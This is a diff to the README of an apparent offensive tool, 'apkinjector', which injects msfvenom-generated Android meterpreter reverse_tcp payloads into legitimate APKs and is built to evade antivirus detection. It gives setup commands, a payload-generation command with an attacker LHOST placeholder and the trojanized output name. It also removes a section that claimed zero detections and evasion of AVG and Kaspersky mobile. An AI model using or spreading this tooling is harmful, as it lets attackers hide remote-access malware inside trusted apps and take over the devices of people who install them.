@@ -10,7 +10,7 @@ Android APK Antivirus evasion for msfvenom generated payloads to inject into ano
 -May require user input, or manually adding the invoke command. The output will explain what is needed.<br>
 -If APKTool fails to decompile, or compile, then the injection will fail. On major apps like Facebook, Starbucks, etc you may find this to happen.<br>
 <br>
-<br><br>
+<br>
 <b>Setup:</b><br>
 chmod +x apkinjector<br>
 mv apkinjector /usr/local/bin/.<br>
@@ -29,12 +29,6 @@ To generate the payload: msfvenom -p android/meterpreter/reverse_tcp LHOST=<IP> 
 <br>
 <b>Output:</b><br>
 injected_\<original>.apk<br>
-<br>
-<b>Antivirus detection:</b><br>
-0/35 on nodistribute - 16Feb17<br>
-Verified for AVG mobile<br>
-Verified for Kaspersky mobile<br>
-<br>
 <br>
 <b>Debugging</b><br>
 Comment out the removal of the /tmp/payload and /tmp/original directories to see the file structure that was compiled.<br>
